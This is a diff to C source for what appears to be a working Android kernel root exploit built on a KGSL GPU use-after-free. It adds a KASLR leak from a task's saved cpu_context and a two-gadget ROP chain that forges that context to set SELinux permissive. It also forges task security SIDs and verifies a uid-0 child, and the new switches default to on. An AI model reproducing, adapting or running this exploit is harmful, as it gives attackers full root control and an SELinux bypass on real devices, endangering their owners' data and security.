@@ -8,6 +8,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <strings.h>
 #include <sys/ioctl.h>
 #include <sys/mman.h>
 #include <sys/prctl.h>
@@ -109,9 +110,16 @@ struct ctrl {
     int sec_errno[12];
     struct selinux_handoff_state handoff;
 };
+struct found {
+    uint64_t page;
+    uint64_t cred;
+    pid_t pid;
+    int idx;
+};
+
 static struct ctrl *ctrls;
-static int g_child_count = 1536;
-static size_t g_pressure_bytes = 768UL * 1024 * 1024;
+static int g_child_count = 4000;
+static size_t g_pressure_bytes = 2560UL * 1024 * 1024;
 static volatile int race_go;
 static int verbose = 1;
 static const struct target_profile *g_target;
@@ -331,6 +339,21 @@ static int read_env_long(const char *name, long minimum, long maximum,
         return -1;
     }
     *value = parsed;
+    return 1;
+}
+
+/*
+ * Presence-based env switches are the wrong default here: root plus
+ * permissive is what this build is for, so flags default to on and only an
+ * explicit 0/no/off/false turns them off (SEC_PERMISSIVE=0, SEC_PERM_TRIGGER=0).
+ */
+static int env_flag(const char *name, int default_value) {
+    const char *raw = getenv(name);
+    if (!raw) return default_value;
+    if (!*raw) return 1;
+    if (!strcmp(raw, "0") || !strcasecmp(raw, "no") ||
+        !strcasecmp(raw, "off") || !strcasecmp(raw, "false"))
+        return 0;
     return 1;
 }
 
@@ -659,6 +682,182 @@ static int initialize_km_buffers(int write_mode)
     if (load_km_backup() < 0) return -1;
     g_km_write_mode = 1;
     return 0;
+}
+
+/*
+ * Kernel write primitive: forged thread.cpu_context
+ * -------------------------------------------------
+ * The addr_limit/KERNEL_DS route cannot patch selinux_state on this device:
+ * the SoC has no UAO (panic dumps show "pstate: ... -UAO"), so the arm64
+ * uaccess helpers are patched to LDTR/STTR and any TTBR1 supervisor address
+ * faults, even with addr_limit == KERNEL_DS.
+ *
+ * What does work is kernel control flow.  struct thread_struct lives inside
+ * the reclaimed task_struct page and can be rewritten through the dangling
+ * GPU mapping.  While the root child blocks in futex_wait, its saved
+ * cpu_context.pc always holds _text + 0x89fc, the return address of
+ * "bl cpu_switch_to" inside __switch_to - a self-validating KASLR leak.
+ *
+ * The parent then rewrites cpu_context for the next switch-in:
+ *
+ *   x19 = selinux_state         (store address)
+ *   x20 = TARGET_SELINUX_WORD   (0x01000000: permissive, still initialised)
+ *   sp  = task + 0xb70          (fpsimd vregs used as a tiny ROP stack)
+ *   pc  = store gadget (0x427410 + slide)
+ *
+ * The two-gadget chain is:
+ *
+ *   str w20, [x19]                  -> selinux_state.enforcing = 0
+ *   ldp x20, x19, [sp, #0x10]
+ *   ldp x29, x30, [sp], #0x20       -> x29 = saved sp, x30 = 0x117228 + slide
+ *   ret
+ *
+ *   0x117228: add sp, x29, #0      -> sp = the saved __switch_to frame
+ *             ldp x20, x19, [sp, #0x10]
+ *             ldp x29, x30, [sp], #0x20   -> __schedule fp / _text+0x9538854
+ *             ret
+ *
+ * That replays __switch_to's own epilogue, so __schedule calls
+ * finish_task_switch() with the untouched x0 (the real previous task) and
+ * the child resumes inside futex_wait.  x0 must not be clobbered:
+ * finish_task(prev) has to clear prev->on_cpu, otherwise the next
+ * try_to_wake_up() spins in smp_cond_load_acquire(&p->on_cpu, !VAL).
+ */
+static uint32_t sec_lo32(uint64_t value) { return (uint32_t)value; }
+static uint32_t sec_hi32(uint64_t value) { return (uint32_t)(value >> 32); }
+
+static uint64_t sec_join64(const uint32_t *words) {
+    return ((uint64_t)words[1] << 32) | words[0];
+}
+
+/*
+ * Build the two-entry chain in the fpsimd vregs and, when trigger is set,
+ * replace thread.cpu_context.  Returns the KASLR slide, or 0 when the dry
+ * run was requested or the leak failed validation.
+ */
+static uint64_t sec_perm_arm(
+        int fd, unsigned ctx, unsigned ib_id, uint64_t ib_gpu, void *ib_vma,
+        unsigned dump_id, uint64_t dump_gpu, void *dump_vma,
+        const struct found *root_child, uint64_t task,
+        int trigger) {
+    if (!g_target->kernel_text_va || !g_target->selinux_state_off ||
+        !g_target->task_cpu_context || !g_target->task_fpsimd ||
+        !g_target->switch_continuation_off ||
+        !g_target->gadget_store_off || !g_target->gadget_switch_return_off)
+        return 0;
+    if ((task & 0xffff000000000000ULL) != 0xffff000000000000ULL) return 0;
+
+    uint32_t context_words[2 * 13] = {0};
+    if (gpu_read_words(fd, ctx, ib_id, ib_gpu, ib_vma, 0x400000,
+                       dump_id, dump_gpu, dump_vma,
+                       root_child->page + g_target->task_cpu_context,
+                       context_words, 26) < 0) {
+        perror("read thread.cpu_context");
+        return 0;
+    }
+    uint64_t saved_sp = sec_join64(&context_words[22]);
+    uint64_t saved_pc = sec_join64(&context_words[24]);
+
+    uint64_t text = g_target->kernel_text_va;
+    uint64_t link_continuation = text + g_target->switch_continuation_off;
+    if ((saved_pc & 0xffff000000000000ULL) != 0xffff000000000000ULL ||
+        saved_pc < link_continuation) {
+        fprintf(stderr, "[-] cpu_context.pc=%016llx does not look like the"
+                        " __switch_to continuation\n",
+                (unsigned long long)saved_pc);
+        return 0;
+    }
+    uint64_t kaslr = saved_pc - link_continuation;
+    if ((kaslr & 0x1fffffULL) != 0 || kaslr < 0x1000000000ULL ||
+        kaslr >= 0x3000000000ULL) {
+        fprintf(stderr, "[-] implausible KASLR slide %016llx\n",
+                (unsigned long long)kaslr);
+        return 0;
+    }
+    if ((saved_sp & 0xffff000000000000ULL) != 0xffff000000000000ULL ||
+        (saved_sp & 0xfULL) != 0) {
+        fprintf(stderr, "[-] implausible kernel stack pointer %016llx\n",
+                (unsigned long long)saved_sp);
+        return 0;
+    }
+
+    uint64_t run_text = text + kaslr;
+    uint64_t state = run_text + g_target->selinux_state_off;
+    uint64_t store_gadget = run_text + g_target->gadget_store_off;
+    uint64_t switch_return = run_text + g_target->gadget_switch_return_off;
+
+    printf("[*] cpu_context pc=%016llx sp=%016llx -> text=%016llx"
+           " kaslr=%016llx\n",
+           (unsigned long long)saved_pc, (unsigned long long)saved_sp,
+           (unsigned long long)run_text, (unsigned long long)kaslr);
+    printf("[*] hijack target selinux_state=%016llx word=%08x\n",
+           (unsigned long long)state, g_target->selinux_word);
+    printf("[*] store gadget=%016llx switch-return=%016llx\n",
+           (unsigned long long)store_gadget,
+           (unsigned long long)switch_return);
+
+    /*
+     * Chain in the fpsimd vregs (task + 0xb70).  Only two gadgets are
+     * needed:
+     *
+     *   gadget 1 (entered from the forged cpu_context):
+     *       str w20, [x19]                  x19 = selinux_state
+     *       ldp x20, x19, [sp, #0x10]       w20 = 0x01000000
+     *       ldp x29, x30, [sp], #0x20       x29 = saved_sp, x30 = gadget 2
+     *       ret
+     *   gadget 2 (0x117228):
+     *       add sp, x29, #0        sp = the saved __switch_to frame
+     *       ldp x20, x19, [sp, #0x10]
+     *       ldp x29, x30, [sp], #0x20   x29 = __schedule fp, x30 = 0x...8854
+     *       ret
+     *
+     * x0 is never touched, so finish_task_switch() still receives the real
+     * previous task and clears its ->on_cpu.
+     */
+    uint64_t chain_kva = task + g_target->task_fpsimd;
+    uint64_t chain[4] = {
+        saved_sp,        /* x29; gadget 2 sets sp from it */
+        switch_return,   /* x30; replays __switch_to's epilogue */
+        0, 0,
+    };
+    uint32_t chain_words[8];
+    for (size_t i = 0; i < 4; i++) {
+        chain_words[2 * i] = sec_lo32(chain[i]);
+        chain_words[2 * i + 1] = sec_hi32(chain[i]);
+    }
+    if (gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, 0x400000,
+                        root_child->page + g_target->task_fpsimd,
+                        chain_words, 8) < 0) {
+        perror("write hijack chain");
+        return 0;
+    }
+
+    uint64_t new_context[13] = {0};
+    new_context[0] = state;                          /* x19 store address */
+    new_context[1] = g_target->selinux_word;         /* x20 store value */
+    new_context[11] = chain_kva;                     /* sp */
+    new_context[12] = store_gadget;                  /* pc */
+    uint32_t forged_words[2 * 13];
+    for (int i = 0; i < 13; i++) {
+        forged_words[2 * i] = sec_lo32(new_context[i]);
+        forged_words[2 * i + 1] = sec_hi32(new_context[i]);
+    }
+
+    if (!trigger) {
+        printf("[*] SEC_PERM_TRIGGER not set: chain prepared but"
+               " cpu_context left untouched\n");
+        return 0;
+    }
+
+    if (gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, 0x400000,
+                        root_child->page + g_target->task_cpu_context,
+                        forged_words, 26) < 0) {
+        perror("forge thread.cpu_context");
+        return 0;
+    }
+    printf("[+] thread.cpu_context armed (sp=%016llx pc=%016llx)\n",
+           (unsigned long long)chain_kva, (unsigned long long)store_gadget);
+    return kaslr;
 }
 
 static void child_loop(int idx, pid_t parent_pid, int kgsl_fd) {
@@ -1127,13 +1326,6 @@ static int parse_child_pid(const unsigned char *comm, pid_t *pid_out) {
     *pid_out = (pid_t)value;
     return 1;
 }
-
-struct found {
-    uint64_t page;
-    uint64_t cred;
-    pid_t pid;
-    int idx;
-};
 
 struct cred_template {
     uint32_t ids[CRED_IDS_LEN / sizeof(uint32_t)];
@@ -2156,6 +2348,30 @@ static void abandon_round(int *fd, unsigned *ib_id, void **ib_vma,
         memset(&ctrls[i], 0, sizeof(ctrls[i]));
 }
 
+static int sec_read_enforce(void) {
+    int fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
+    if (fd < 0) return -1;
+    char value[8] = {0};
+    ssize_t n = read(fd, value, sizeof(value) - 1);
+    close(fd);
+    if (n <= 0) return -1;
+    return value[0] == '0' ? 0 : 1;
+}
+
+static void sec_report_permissive(uint64_t kaslr, pid_t pid) {
+    char state = '?';
+    if (read_proc_task_state(pid, &state) < 0) state = '?';
+    int enforce = sec_read_enforce();
+    printf("[*] hijack kaslr=%016llx child state=%c enforce=%d\n",
+           (unsigned long long)kaslr, state, enforce);
+    if (!kaslr) return;
+    if (enforce == 0)
+        printf("[+] SELinux is now permissive for this boot\n");
+    else
+        fprintf(stderr, "[-] hijack ran but selinux_state.enforcing still"
+                        " reads %d\n", enforce);
+}
+
 int main(int argc, char **argv) {
     setvbuf(stdout, NULL, _IONBF, 0);
     setvbuf(stderr, NULL, _IONBF, 0);
@@ -2176,13 +2392,24 @@ int main(int argc, char **argv) {
     const char *km_mode = getenv("KM_UNLOCK_MODE");
     int run_kmunlock = km_mode && *km_mode;
     int sec_sid_mode = getenv("SEC_SID") != NULL;
+    int sec_perm_mode = env_flag("SEC_PERMISSIVE", 1);
     if (run_kmunlock && strcmp(km_mode, "read") && strcmp(km_mode, "write")) {
         fprintf(stderr, "[-] KM_UNLOCK_MODE must be read or write\n");
         return 2;
     }
     if (!run_kmunlock && !sec_sid_mode && su_runtime_wait_ready(300) == 0) {
-        printf("[+] root su service already running\n");
-        return 0;
+        if (!sec_perm_mode) {
+            printf("[+] root su service already running\n");
+            return 0;
+        }
+        if (sec_read_enforce() == 0) {
+            printf("[+] root su service already running, SELinux permissive\n");
+            return 0;
+        }
+        fprintf(stderr,
+                "[-] root su service already running but SELinux is enforcing;"
+                " reboot and run again\n");
+        return 1;
     }
 
     pid_t qsee_pid = -1;
@@ -2266,7 +2493,7 @@ int main(int argc, char **argv) {
         return 1;
     }
 
-    long rounds = 4;
+    long rounds = 8;
     env_status = read_env_long("KGSL_ROUNDS", 1, 16, &rounds);
     if (env_status < 0) {
         fprintf(stderr, "[-] KGSL_ROUNDS must be between 1 and 16\n");
@@ -2279,7 +2506,10 @@ int main(int argc, char **argv) {
     uint64_t ib_gpu = 0, dump_gpu = 0;
     void *ib_vma = NULL, *dump_vma = NULL;
     struct found root_child = {0};
+    struct found task_candidates[MAX_TASK_CANDIDATES];
+    size_t task_candidate_count = 0;
     uint64_t selected_cred_alias = 0;
+    uint64_t root_task_kva = 0;
     int root_verified = 0;
 
     for (int round = 1; round <= (int)rounds && !root_verified; round++) {
@@ -2330,8 +2560,6 @@ int main(int argc, char **argv) {
             continue;
         }
 
-        struct found task_candidates[MAX_TASK_CANDIDATES];
-        size_t task_candidate_count = 0;
         if (find_task_candidates(
                 fd, ctx, ib_id, ib_gpu, ib_vma, 0x400000,
                 dump_id, dump_gpu, dump_vma, uaf_gpu, g_target,
@@ -2362,9 +2590,11 @@ int main(int argc, char **argv) {
     }
 
     uint64_t forged_security = 0;
-    if (sec_sid_mode) {
-        if (!g_target->task_security || !g_target->task_fake_sec ||
-            !g_target->task_group_leader || !selected_cred_alias) {
+    if (sec_sid_mode || sec_perm_mode) {
+        if (!g_target->task_group_leader ||
+            (sec_sid_mode && (!g_target->task_security ||
+                              !g_target->task_fake_sec ||
+                              !selected_cred_alias))) {
             fprintf(stderr,
                     "[-] SEC_SID needs task_security/task_fake_sec/"
                     "task_group_leader and a cred alias\n");
@@ -2392,35 +2622,41 @@ int main(int argc, char **argv) {
             kill_children_except(-1);
             return 1;
         }
-        forged_security = group_leader + g_target->task_fake_sec;
-        uint32_t sid_value = 1;
-        {
-            const char *sid_env = getenv("SEC_SID");
-            if (sid_env && *sid_env >= '0' && *sid_env <= '9')
-                sid_value = (uint32_t)strtoul(sid_env, NULL, 0);
+        root_task_kva = group_leader;
+        printf("[*] root child task_struct kva=%016llx\n",
+               (unsigned long long)group_leader);
+        if (sec_sid_mode) {
+            forged_security = group_leader + g_target->task_fake_sec;
+            uint32_t sid_value = 1;
+            {
+                const char *sid_env = getenv("SEC_SID");
+                if (sid_env && *sid_env >= '0' && *sid_env <= '9')
+                    sid_value = (uint32_t)strtoul(sid_env, NULL, 0);
+            }
+            uint32_t ids[2] = {sid_value, sid_value};  /* osid = sid */
+            printf("[*] forging SID %u\n", sid_value);
+            uint32_t ptr[2] = {(uint32_t)forged_security,
+                               (uint32_t)(forged_security >> 32)};
+            if (gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, 0x400000,
+                                root_child.page + g_target->task_fake_sec,
+                                ids, 2) < 0 ||
+                gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, 0x400000,
+                                root_child.page + g_target->task_security,
+                                ptr, 2) < 0 ||
+                gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, 0x400000,
+                                selected_cred_alias + g_target->cred_security,
+                                ptr, 2) < 0) {
+                perror("forge task_security_struct");
+                kill_children_except(-1);
+                return 1;
+            }
+            printf("[+] forged SID %u task_security_struct: kva=%016llx gpu=%016llx\n",
+                   sid_value,
+                   (unsigned long long)forged_security,
+                   (unsigned long long)(root_child.page +
+                                        g_target->task_fake_sec));
+            ctrls[root_child.idx].sec_fake_addr = forged_security;
         }
-        uint32_t ids[2] = {sid_value, sid_value};  /* osid = sid */
-        printf("[*] forging SID %u\n", sid_value);
-        uint32_t ptr[2] = {(uint32_t)forged_security,
-                           (uint32_t)(forged_security >> 32)};
-        if (gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, 0x400000,
-                            root_child.page + g_target->task_fake_sec,
-                            ids, 2) < 0 ||
-            gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, 0x400000,
-                            root_child.page + g_target->task_security,
-                            ptr, 2) < 0 ||
-            gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, 0x400000,
-                            selected_cred_alias + g_target->cred_security,
-                            ptr, 2) < 0) {
-            perror("forge task_security_struct");
-            kill_children_except(-1);
-            return 1;
-        }
-        printf("[+] forged SID %u task_security_struct: kva=%016llx gpu=%016llx\n",
-               sid_value,
-               (unsigned long long)forged_security,
-               (unsigned long long)(root_child.page + g_target->task_fake_sec));
-        ctrls[root_child.idx].sec_fake_addr = forged_security;
     }
 
     uint64_t child_security = 0;
@@ -2475,6 +2711,17 @@ int main(int argc, char **argv) {
         printf("[*] staged %lld bytes for partition '%s'\n", len,
                wname ? wname : "");
     }
+    uint64_t hijack_kaslr = 0;
+    if (sec_perm_mode) {
+        hijack_kaslr = sec_perm_arm(fd, ctx, ib_id, ib_gpu, ib_vma,
+                                    dump_id, dump_gpu, dump_vma,
+                                    &root_child, root_task_kva,
+                                    env_flag("SEC_PERM_TRIGGER", 1));
+        if (!hijack_kaslr)
+            fprintf(stderr,
+                    "[-] permissive hijack not armed; child will resume"
+                    " normally\n");
+    }
     ctrls[root_child.idx].handoff.current_security = child_security;
     ctrls[root_child.idx].root_done = 0;
     ctrls[root_child.idx].error = 0;
@@ -2488,6 +2735,7 @@ int main(int argc, char **argv) {
     }
     printf("[+] child %d verified uid/euid/gid/egid 0\n", root_child.pid);
     mark("root verified");
+    if (sec_perm_mode) sec_report_permissive(hijack_kaslr, root_child.pid);
     if (sec_sid_mode && getenv("SEC_SIDSCAN") && forged_security) {
         int blk = 0, qse = 0, ctl = 0;
         int scan_max = SEC_SID_SCAN_MAX;
